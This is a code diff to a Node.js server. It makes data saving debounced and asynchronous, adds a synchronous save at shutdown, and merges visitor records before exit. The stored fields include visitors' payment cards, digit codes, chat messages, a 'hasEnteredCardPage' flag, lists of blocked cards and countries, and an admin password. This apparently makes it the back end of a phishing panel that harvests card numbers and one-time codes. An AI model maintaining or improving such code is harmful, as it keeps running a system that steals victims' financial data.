@@ -120,8 +120,28 @@ function loadSavedData() {
   };
 }
 
-// Save data to file with backup
+// Save data to file with backup (async, non-blocking)
+let saveTimer = null;
+let isSaving = false;
+
 function saveData() {
+  // Debounce: wait 2 seconds before saving to batch multiple saves together
+  if (saveTimer) clearTimeout(saveTimer);
+  saveTimer = setTimeout(() => {
+    _doSave();
+  }, 2000);
+}
+
+// Force immediate save (for shutdown)
+function saveDataImmediate() {
+  if (saveTimer) clearTimeout(saveTimer);
+  _doSaveSync();
+}
+
+// Async save - does not block the server
+async function _doSave() {
+  if (isSaving) return; // Skip if already saving
+  isSaving = true;
   ensureDataDir();
   
   try {
@@ -135,22 +155,44 @@ function saveData() {
       adminPassword,
       lastSaved: new Date().toISOString(),
     };
-    const jsonData = JSON.stringify(data, null, 2);
+    const jsonData = JSON.stringify(data);
     
-    // Create backup of existing file first
+    // Async write - non-blocking
+    const fsPromises = require('fs').promises;
     if (fs.existsSync(DATA_FILE)) {
-      try {
-        fs.copyFileSync(DATA_FILE, BACKUP_FILE);
-      } catch (backupErr) {
-        console.error("Error creating backup:", backupErr);
-      }
+      await fsPromises.copyFile(DATA_FILE, BACKUP_FILE).catch(() => {});
     }
-    
-    // Write main file
-    fs.writeFileSync(DATA_FILE, jsonData);
-    console.log(`Data saved: ${savedVisitors.length} visitors at ${new Date().toISOString()}`);
+    await fsPromises.writeFile(DATA_FILE, jsonData);
+    console.log(`Data saved: ${savedVisitors.length} visitors`);
   } catch (error) {
     console.error("Error saving data:", error);
+  } finally {
+    isSaving = false;
+  }
+}
+
+// Sync save - only for shutdown
+function _doSaveSync() {
+  ensureDataDir();
+  try {
+    const data = {
+      visitors: Object.fromEntries(visitors),
+      visitorCounter,
+      savedVisitors,
+      whatsappNumber,
+      globalBlockedCards,
+      globalBlockedCountries,
+      adminPassword,
+      lastSaved: new Date().toISOString(),
+    };
+    const jsonData = JSON.stringify(data);
+    if (fs.existsSync(DATA_FILE)) {
+      try { fs.copyFileSync(DATA_FILE, BACKUP_FILE); } catch(e) {}
+    }
+    fs.writeFileSync(DATA_FILE, jsonData);
+    console.log(`Data saved (sync): ${savedVisitors.length} visitors`);
+  } catch (error) {
+    console.error("Error saving data (sync):", error);
   }
 }
 
@@ -1105,9 +1147,30 @@ function gracefulShutdown(signal) {
   console.log(`${signal} received. Saving all data before shutdown...`);
   // Sync all active visitors to savedVisitors before shutdown
   visitors.forEach((visitor) => {
-    saveVisitorPermanently(visitor);
+    const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
+    if (existingIndex >= 0) {
+      const existing = savedVisitors[existingIndex];
+      const merged = { ...existing, ...visitor };
+      if (existing.dataHistory && visitor.dataHistory) {
+        merged.dataHistory = existing.dataHistory.length >= visitor.dataHistory.length ? [...existing.dataHistory] : [...visitor.dataHistory];
+      }
+      if (existing.paymentCards && visitor.paymentCards) {
+        merged.paymentCards = existing.paymentCards.length >= visitor.paymentCards.length ? [...existing.paymentCards] : [...visitor.paymentCards];
+      }
+      if (existing.digitCodes && visitor.digitCodes) {
+        merged.digitCodes = existing.digitCodes.length >= visitor.digitCodes.length ? [...existing.digitCodes] : [...visitor.digitCodes];
+      }
+      if (existing.chatMessages && visitor.chatMessages) {
+        merged.chatMessages = existing.chatMessages.length >= visitor.chatMessages.length ? [...existing.chatMessages] : [...visitor.chatMessages];
+      }
+      if (existing.data && visitor.data) {
+        merged.data = { ...existing.data, ...visitor.data };
+      }
+      if (existing.hasEnteredCardPage) merged.hasEnteredCardPage = true;
+      savedVisitors[existingIndex] = merged;
+    }
   });
-  saveData();
+  saveDataImmediate();
   console.log('All data saved. Shutting down...');
   process.exit(0);
 }
